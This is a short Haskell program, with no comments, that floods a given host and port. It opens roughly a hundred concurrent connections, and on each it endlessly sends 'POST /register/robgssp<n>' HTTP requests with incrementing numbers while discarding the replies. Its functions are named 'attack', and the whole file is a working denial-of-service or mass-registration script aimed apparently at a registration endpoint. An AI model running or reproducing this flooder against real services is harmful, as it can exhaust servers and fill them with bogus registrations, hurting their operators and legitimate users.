{-# LANGUAGE OverloadedStrings #-}
import System.Random
import Network
import Control.Monad
import qualified Data.ByteString.Char8 as B
import Control.Concurrent
import Foreign.Marshal.Alloc
import GHC.IO.Handle
import System.Environment

main = do
  [host, port] <- getArgs
  sh <- connectTo host $ PortNumber $ fromIntegral $ (read port :: Integer)
  forM_ ([0..98]::[Int]) $ \_ -> forkIO (attack host (fromIntegral (read port)))
  attack1 sh 0

attack host port = do
  hnd <- connectTo host $ PortNumber port
  start <- randomRIO (0,2^32)
  attack1 hnd start

attack1 sock start = do
  forkIO $ do
    let sz = 1024*1024
    buf <- mallocBytes sz
    forever $ hGetBuf sock buf sz >> return () 
  let loop n = do
        hPutStr sock (msg n)
        loop (n+1)
    in loop start

msg :: Integer -> [Char]
msg n = "POST /register/robgssp" ++ (show n) ++ " HTTP/1.1\r\n\r\n"
